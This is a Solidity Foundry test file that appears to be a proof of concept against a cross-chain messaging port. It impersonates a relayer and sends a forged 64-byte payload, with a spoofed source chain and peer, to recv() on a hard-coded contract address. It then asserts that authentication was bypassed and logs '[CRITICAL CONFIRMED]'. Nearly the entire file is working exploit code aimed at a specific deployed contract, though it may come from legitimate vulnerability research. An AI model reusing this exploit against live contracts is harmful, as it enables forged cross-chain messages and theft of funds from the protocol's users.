// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IORMPPort {
    function recv(
        address fromDapp,
        address toDapp,
        bytes calldata message
    ) external payable;
}

contract PortAuthCapture {
    bool public authPassed;

    fallback(bytes calldata) external payable 
    returns (bytes memory) {
        authPassed = true;
        return "";
    }

    receive() external payable {}
}

contract XmsgSenderForgeTest is Test {

    address constant TARGET =
        0x2cd1867Fb8016f93710B6386f7f9F1D540A60812;
    address constant RELAY =
        0x13b2211a7cA45Db2808F6dB05557ce5347e3634e;
    address constant PEER =
        0x2cd1867Fb8016f93710B6386f7f9F1D540A60812;
    uint256 constant FROM_CHAIN = 42161;

    function testPayloadAlignment() public pure {
        bytes memory payload = bytes.concat(
            bytes12(0),
            bytes32(uint256(FROM_CHAIN)),
            bytes20(PEER)
        );
        assertEq(payload.length, 64);
        assertEq(payload.length % 32, 0);
    }

    function testForge_ORMPPort_v13() public {
        PortAuthCapture c = new PortAuthCapture();

        bytes memory payload = bytes.concat(
            bytes12(0),
            bytes32(uint256(FROM_CHAIN)),
            bytes20(PEER)
        );

        assertEq(
            payload.length, 
            64, 
            "payload must be 64 bytes"
        );
        assertEq(
            payload.length % 32, 
            0, 
            "payload must be aligned"
        );

        vm.prank(RELAY);
        (bool ok,) = TARGET.call(
            abi.encodeWithSelector(
                IORMPPort.recv.selector,
                address(0xdead),
                address(c),
                payload
            )
        );

        assertTrue(ok, "recv() reverted");
        assertTrue(c.authPassed(), "AUTH NOT BYPASSED");

        console.log("[CRITICAL CONFIRMED]");
        console.log("recv() completed:", ok);
        console.log("authPassed:", c.authPassed());
    }
}